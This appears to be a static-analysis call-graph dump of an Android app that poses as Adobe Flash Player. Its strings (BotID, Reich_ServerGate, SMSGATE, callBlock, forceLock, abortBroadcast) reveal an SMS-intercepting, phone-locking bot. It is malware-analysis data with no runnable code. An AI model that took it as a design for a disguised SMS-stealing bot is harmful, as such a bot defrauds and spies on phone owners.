VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
SPECIAL edge: $r14 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotID") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r9 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>("warn", $r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r11 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r20.<java.lang.String: boolean equals(java.lang.Object)>("On") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<android.os.AsyncTask: void <init>()>() in <com.adobe.flashplayer_.FlashVirtual: void <init>()> ==> <android.os.AsyncTask: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean contains(java.lang.CharSequence)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("Visits: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("*") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("spam_data", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashY: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.BK: void setContentView(int)>(2130903044) in <com.adobe.packages.BK: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.SystemSWF: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>("*") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r19 = virtualinvoke $r5.<java.lang.String: java.lang.String[] split(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("setFilter[") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getMessages") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forceZ", "On", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("callBlock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("forceZ", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Package: ") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: $l4 = virtualinvoke r3.<java.io.File: long length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: long length()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r13) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(" ", "_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r6, r8, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r27) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:SMSGATE") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("forceLock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke r6.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void <init>()> ==> <android.app.Service: void <init>()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r19 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
